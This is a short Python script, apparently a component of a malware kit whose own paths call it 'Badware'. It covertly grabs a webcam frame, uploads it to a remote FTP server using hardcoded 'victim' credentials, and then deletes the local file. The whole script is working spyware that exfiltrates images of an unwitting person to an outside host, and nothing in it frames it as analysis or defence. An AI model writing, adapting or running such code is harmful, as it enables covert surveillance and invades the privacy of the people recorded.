
import os
import cv2
import ftplib
username = os.getlogin()

with open(fr'C:\users\{username}\AppData\local\Aryan\Badware\ftpserver', "r") as servername:
	server = servername.read()
cam = cv2.VideoCapture(int(__import__("sys").argv[1]))
result, image = cam.read()
if result:
	#cv2.imshow("image", image)
	cv2.imwrite(fr'C:\users\{username}\AppData\local\Aryan\Badware\screen{__import__("sys").argv[1]}.png', image)
	#cv2.waitKey(0)
	#cv2.destroyWindow("image")

else:
	if os.path.isfile(fr'screen{__import__("sys").argv[1]}.png'):os.remove(f'screen{__import__("sys").argv[1]}.png')
	with open(fr'screen{__import__("sys").argv[1]}.png' , "x") as fail:
		fail.write(fr'unavailable on serial {__import__("sys").argv[1]}')
session = ftplib.FTP(server,'victim','victimpass1234')
with open(fr'screen{__import__("sys").argv[1]}.png','rb') as imageresult:
	session.storbinary('STOR result.png', imageresult)
session.quit()
os.remove(fr'screen{__import__("sys").argv[1]}.png')